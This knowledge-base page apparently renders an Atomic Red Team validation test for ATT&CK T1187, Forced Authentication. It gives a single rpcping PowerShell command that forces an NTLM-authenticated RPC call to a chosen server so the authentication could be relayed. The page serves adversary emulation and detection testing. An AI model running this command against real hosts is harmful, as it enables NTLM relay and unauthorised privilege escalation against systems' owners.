---
atomic_guid: "81cfdd7f-1f41-4cc5-9845-bb5149438e37"
title: "Trigger an authenticated RPC call to a target server with no Sign flag set"
framework: "atomic"
generated: "true"
attack_technique_id: "T1187"
attack_technique_name: "Forced Authentication"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1187/T1187.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "81cfdd7f-1f41-4cc5-9845-bb5149438e37"
  - "Trigger an authenticated RPC call to a target server with no Sign flag set"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Trigger an authenticated RPC call to a target server with no Sign flag set

RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
Ref: https://twitter.com/splinter_code/status/1421144623678988298

## Metadata

- Atomic GUID: 81cfdd7f-1f41-4cc5-9845-bb5149438e37
- Technique: T1187: Forced Authentication
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1187/T1187.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1187-forced_authentication|T1187]]

## Input Arguments

### custom_port

- description: Specify the custom port number
- type: integer
- default: 9997

### server_ip

- description: Specify the server IP address. If not specified, the loop back IP will be used
- type: string
- default: 127.0.0.1

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1187/T1187.yaml)
